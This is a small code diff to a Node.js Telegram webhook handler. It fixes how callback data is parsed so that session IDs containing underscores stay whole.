@@ -142,7 +142,9 @@ app.post('/api/telegram-webhook', async (req, res) => {
     if (update.callback_query) {
         const callbackQuery = update.callback_query;
         const data = callbackQuery.data; // e.g., "success_sess_abc123"
-        const [action, sessionId] = data.split('_');
+        const underscoreIndex = data.indexOf('_');
+        const action = data.substring(0, underscoreIndex);
+        const sessionId = data.substring(underscoreIndex + 1);
 
         if (sessions[sessionId]) {
             if (action === 'success') {
